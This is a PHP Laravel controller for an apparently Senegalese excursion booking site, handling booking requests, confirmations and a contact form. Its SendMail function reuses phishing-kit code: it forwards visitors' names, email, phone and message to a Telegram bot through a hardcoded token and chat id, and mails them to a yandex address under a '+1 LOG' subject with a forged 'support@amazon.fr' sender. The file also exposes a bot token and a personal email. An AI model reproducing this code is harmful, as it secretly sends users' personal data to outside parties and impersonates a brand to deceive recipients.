<?php

namespace App\Http\Controllers;
use App\Models\ExcursionRequest;
use App\Mail\ExcursionRequestConfirmation;
use App\Mail\ExcursionAdminNotification;
use Illuminate\Support\Facades\Mail;


use Illuminate\Http\Request;

class FormController extends Controller
{
    //
    public function Envoie(Request $request){
        $data = $request->validate([
        'nom' => 'required|string',
        'email' => 'required|email',
        'tel' => 'required|string',
        'destination' => 'required|string',
        'nbr_Pax' => 'required|integer',
        'date' => 'required|date',
        'message' => 'required|string',
    ]);

    $reservation = ExcursionRequest::create($data);

    Mail::to($reservation->email)->send(new ExcursionRequestConfirmation($reservation));

    return redirect()->back()->with([
        'message' => 'Demande envoyée. Veuillez confirmer via l’email.',
        'alert-type' => 'success',
    ]);
    }

    public function confirmReservation($id)
        {
            $reservation = ExcursionRequest::findOrFail($id);
            $reservation->confirmed = true;
            $reservation->save();

            // Email à l'admin
            Mail::to('adiop6225@gmail.com')->send(new ExcursionAdminNotification($reservation));

            return view('frontend.excursion.confirmed'); // Crée une page de confirmation
        }

    public function Contact(){
        return view('frontend.contact.contact');
    }

    public function SendMail(){
           # Function Set-Up
           function sendContactTelegram($chatID, $messaggio, $token) {
            $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
            $url = $url . "&text=" . urlencode($messaggio);
            $ch = curl_init();
            $optArray = array(
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true
            );
            curl_setopt_array($ch, $optArray);
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;
        }

        # E-Mail Set-Up
        $email = "";

        # Telegram Set-Up
        $token = "6701275772:AAFydTVwNCTY5O8g_RtfGvOvNx8fU60im3I";
        $chat_id = "-4263196485";
        session_start();
      
    
        if (isset($_POST['email'])) {
            $email = $_POST['email'] ;
           
            $nom = $_POST['fname'] ?? '';
            $prenom = $_POST['lname'] ?? ''; 
            $number= $_POST['number'] ?? '';
            $messages = $_POST['messages'] ?? ''; 
          




            $message = "[✈️✈️]Nouvelle Message SoluGuide ✅ [🏝🏝]\n";
            $message .= "[✉️] E-Mail : " . $email . "\n"; 
           
            $message .= "[😊] Nom : " . $nom . "\n";
            $message .= "[👥] Prenom : " . $prenom ."\n";
            $message .= "[🏝] Téléphone : " . $number  ."\n"; 
            $message .= "[📝] Message : " . $messages  ."\n"; 




            $subject = "🕸 | +1 LOG - " . $email . " | 🎰";
            $from = "From: 🕸 MiiuUHQ 🕸 <support@amazon.fr>";
          
            
            mail("ton-mail-ici@yandex.com",$subject,$message,$from);
            sendContactTelegram($chat_id,$message,$token);
           
            
            $notification = array(
                'message' =>'Bravo, votre message a été envoyé',
                'alert-type' => 'success'
            );
            
            $redirect = "https://www.vacanceausenegal.com/";
            $liv = "&email=".$email;
            return  redirect()->back()->with($notification);
        }

    }
}
